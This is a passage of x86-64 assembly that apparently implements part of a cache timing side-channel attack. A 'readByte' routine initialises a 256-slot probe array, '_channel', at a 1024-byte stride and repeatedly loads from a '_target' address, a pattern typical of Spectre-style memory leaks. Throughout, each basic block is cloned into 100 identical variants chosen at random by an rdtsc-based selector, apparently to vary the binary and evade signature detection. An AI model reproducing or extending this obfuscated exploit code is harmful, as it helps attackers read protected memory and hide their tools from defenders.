	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 54
.LreadByte_win8_var54:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 55
.LreadByte_win8_var55:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 56
.LreadByte_win8_var56:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 57
.LreadByte_win8_var57:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 58
.LreadByte_win8_var58:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 59
.LreadByte_win8_var59:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 60
.LreadByte_win8_var60:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 61
.LreadByte_win8_var61:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 62
.LreadByte_win8_var62:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 63
.LreadByte_win8_var63:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 64
.LreadByte_win8_var64:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 65
.LreadByte_win8_var65:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 66
.LreadByte_win8_var66:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 67
.LreadByte_win8_var67:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 68
.LreadByte_win8_var68:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 69
.LreadByte_win8_var69:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 70
.LreadByte_win8_var70:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 71
.LreadByte_win8_var71:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 72
.LreadByte_win8_var72:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 73
.LreadByte_win8_var73:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 74
.LreadByte_win8_var74:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 75
.LreadByte_win8_var75:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 76
.LreadByte_win8_var76:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 77
.LreadByte_win8_var77:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 78
.LreadByte_win8_var78:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 79
.LreadByte_win8_var79:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 80
.LreadByte_win8_var80:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 81
.LreadByte_win8_var81:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 82
.LreadByte_win8_var82:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 83
.LreadByte_win8_var83:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 84
.LreadByte_win8_var84:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 85
.LreadByte_win8_var85:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 86
.LreadByte_win8_var86:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 87
.LreadByte_win8_var87:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 88
.LreadByte_win8_var88:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 89
.LreadByte_win8_var89:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 90
.LreadByte_win8_var90:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 91
.LreadByte_win8_var91:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 92
.LreadByte_win8_var92:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 93
.LreadByte_win8_var93:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 94
.LreadByte_win8_var94:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 95
.LreadByte_win8_var95:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 96
.LreadByte_win8_var96:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 97
.LreadByte_win8_var97:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 98
.LreadByte_win8_var98:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
## Variant 99
.LreadByte_win8_var99:
	popq	%rax
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win8_continue
.LreadByte_win8_continue:
	movl	-1072(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB3_1 Depth=1
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_1
LBB3_4:
	movl	$999, -1068(%rbp)    # # imm = 0x3E7
LBB3_5:                                 ## =>This Loop Header: Depth=1
                                        ##     Child Loop BB3_7 Depth 2
                                        ##     Child Loop BB3_11 Depth 2
                                        ##     Child Loop BB3_15 Depth 2
                                        ##     Child Loop BB3_21 Depth 2
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadByte_win7_var0
	cmpl	$1, %eax
	je	.LreadByte_win7_var1
	cmpl	$2, %eax
	je	.LreadByte_win7_var2
	cmpl	$3, %eax
	je	.LreadByte_win7_var3
	cmpl	$4, %eax
	je	.LreadByte_win7_var4
	cmpl	$5, %eax
	je	.LreadByte_win7_var5
	cmpl	$6, %eax
	je	.LreadByte_win7_var6
	cmpl	$7, %eax
	je	.LreadByte_win7_var7
	cmpl	$8, %eax
	je	.LreadByte_win7_var8
	cmpl	$9, %eax
	je	.LreadByte_win7_var9
	cmpl	$10, %eax
	je	.LreadByte_win7_var10
	cmpl	$11, %eax
	je	.LreadByte_win7_var11
	cmpl	$12, %eax
	je	.LreadByte_win7_var12
	cmpl	$13, %eax
	je	.LreadByte_win7_var13
	cmpl	$14, %eax
	je	.LreadByte_win7_var14
	cmpl	$15, %eax
	je	.LreadByte_win7_var15
	cmpl	$16, %eax
	je	.LreadByte_win7_var16
	cmpl	$17, %eax
	je	.LreadByte_win7_var17
	cmpl	$18, %eax
	je	.LreadByte_win7_var18
	cmpl	$19, %eax
	je	.LreadByte_win7_var19
	cmpl	$20, %eax
	je	.LreadByte_win7_var20
	cmpl	$21, %eax
	je	.LreadByte_win7_var21
	cmpl	$22, %eax
	je	.LreadByte_win7_var22
	cmpl	$23, %eax
	je	.LreadByte_win7_var23
	cmpl	$24, %eax
	je	.LreadByte_win7_var24
	cmpl	$25, %eax
	je	.LreadByte_win7_var25
	cmpl	$26, %eax
	je	.LreadByte_win7_var26
	cmpl	$27, %eax
	je	.LreadByte_win7_var27
	cmpl	$28, %eax
	je	.LreadByte_win7_var28
	cmpl	$29, %eax
	je	.LreadByte_win7_var29
	cmpl	$30, %eax
	je	.LreadByte_win7_var30
	cmpl	$31, %eax
	je	.LreadByte_win7_var31
	cmpl	$32, %eax
	je	.LreadByte_win7_var32
	cmpl	$33, %eax
	je	.LreadByte_win7_var33
	cmpl	$34, %eax
	je	.LreadByte_win7_var34
	cmpl	$35, %eax
	je	.LreadByte_win7_var35
	cmpl	$36, %eax
	je	.LreadByte_win7_var36
	cmpl	$37, %eax
	je	.LreadByte_win7_var37
	cmpl	$38, %eax
	je	.LreadByte_win7_var38
	cmpl	$39, %eax
	je	.LreadByte_win7_var39
	cmpl	$40, %eax
	je	.LreadByte_win7_var40
	cmpl	$41, %eax
	je	.LreadByte_win7_var41
	cmpl	$42, %eax
	je	.LreadByte_win7_var42
	cmpl	$43, %eax
	je	.LreadByte_win7_var43
	cmpl	$44, %eax
	je	.LreadByte_win7_var44
	cmpl	$45, %eax
	je	.LreadByte_win7_var45
	cmpl	$46, %eax
	je	.LreadByte_win7_var46
	cmpl	$47, %eax
	je	.LreadByte_win7_var47
	cmpl	$48, %eax
	je	.LreadByte_win7_var48
	cmpl	$49, %eax
	je	.LreadByte_win7_var49
	cmpl	$50, %eax
	je	.LreadByte_win7_var50
	cmpl	$51, %eax
	je	.LreadByte_win7_var51
	cmpl	$52, %eax
	je	.LreadByte_win7_var52
	cmpl	$53, %eax
	je	.LreadByte_win7_var53
	cmpl	$54, %eax
	je	.LreadByte_win7_var54
	cmpl	$55, %eax
	je	.LreadByte_win7_var55
	cmpl	$56, %eax
	je	.LreadByte_win7_var56
	cmpl	$57, %eax
	je	.LreadByte_win7_var57
	cmpl	$58, %eax
	je	.LreadByte_win7_var58
	cmpl	$59, %eax
	je	.LreadByte_win7_var59
	cmpl	$60, %eax
	je	.LreadByte_win7_var60
	cmpl	$61, %eax
	je	.LreadByte_win7_var61
	cmpl	$62, %eax
	je	.LreadByte_win7_var62
	cmpl	$63, %eax
	je	.LreadByte_win7_var63
	cmpl	$64, %eax
	je	.LreadByte_win7_var64
	cmpl	$65, %eax
	je	.LreadByte_win7_var65
	cmpl	$66, %eax
	je	.LreadByte_win7_var66
	cmpl	$67, %eax
	je	.LreadByte_win7_var67
	cmpl	$68, %eax
	je	.LreadByte_win7_var68
	cmpl	$69, %eax
	je	.LreadByte_win7_var69
	cmpl	$70, %eax
	je	.LreadByte_win7_var70
	cmpl	$71, %eax
	je	.LreadByte_win7_var71
	cmpl	$72, %eax
	je	.LreadByte_win7_var72
	cmpl	$73, %eax
	je	.LreadByte_win7_var73
	cmpl	$74, %eax
	je	.LreadByte_win7_var74
	cmpl	$75, %eax
	je	.LreadByte_win7_var75
	cmpl	$76, %eax
	je	.LreadByte_win7_var76
	cmpl	$77, %eax
	je	.LreadByte_win7_var77
	cmpl	$78, %eax
	je	.LreadByte_win7_var78
	cmpl	$79, %eax
	je	.LreadByte_win7_var79
	cmpl	$80, %eax
	je	.LreadByte_win7_var80
	cmpl	$81, %eax
	je	.LreadByte_win7_var81
	cmpl	$82, %eax
	je	.LreadByte_win7_var82
	cmpl	$83, %eax
	je	.LreadByte_win7_var83
	cmpl	$84, %eax
	je	.LreadByte_win7_var84
	cmpl	$85, %eax
	je	.LreadByte_win7_var85
	cmpl	$86, %eax
	je	.LreadByte_win7_var86
	cmpl	$87, %eax
	je	.LreadByte_win7_var87
	cmpl	$88, %eax
	je	.LreadByte_win7_var88
	cmpl	$89, %eax
	je	.LreadByte_win7_var89
	cmpl	$90, %eax
	je	.LreadByte_win7_var90
	cmpl	$91, %eax
	je	.LreadByte_win7_var91
	cmpl	$92, %eax
	je	.LreadByte_win7_var92
	cmpl	$93, %eax
	je	.LreadByte_win7_var93
	cmpl	$94, %eax
	je	.LreadByte_win7_var94
	cmpl	$95, %eax
	je	.LreadByte_win7_var95
	cmpl	$96, %eax
	je	.LreadByte_win7_var96
	cmpl	$97, %eax
	je	.LreadByte_win7_var97
	cmpl	$98, %eax
	je	.LreadByte_win7_var98
	cmpl	$99, %eax
	je	.LreadByte_win7_var99
	jmp	.LreadByte_win7_var0
## Variant 0
.LreadByte_win7_var0:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 1
.LreadByte_win7_var1:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 2
.LreadByte_win7_var2:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 3
.LreadByte_win7_var3:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 4
.LreadByte_win7_var4:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 5
.LreadByte_win7_var5:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 6
.LreadByte_win7_var6:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 7
.LreadByte_win7_var7:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 8
.LreadByte_win7_var8:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 9
.LreadByte_win7_var9:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 10
.LreadByte_win7_var10:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 11
.LreadByte_win7_var11:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 12
.LreadByte_win7_var12:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 13
.LreadByte_win7_var13:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 14
.LreadByte_win7_var14:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 15
.LreadByte_win7_var15:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 16
.LreadByte_win7_var16:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 17
.LreadByte_win7_var17:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 18
.LreadByte_win7_var18:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 19
.LreadByte_win7_var19:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 20
.LreadByte_win7_var20:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 21
.LreadByte_win7_var21:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 22
.LreadByte_win7_var22:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 23
.LreadByte_win7_var23:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 24
.LreadByte_win7_var24:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 25
.LreadByte_win7_var25:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 26
.LreadByte_win7_var26:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 27
.LreadByte_win7_var27:
	popq	%rax
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	jmp	.LreadByte_win7_continue
## Variant 28
.LreadByte_win7_var28:
	popq	%rax
	cmpl	$0, -1068(%rbp)
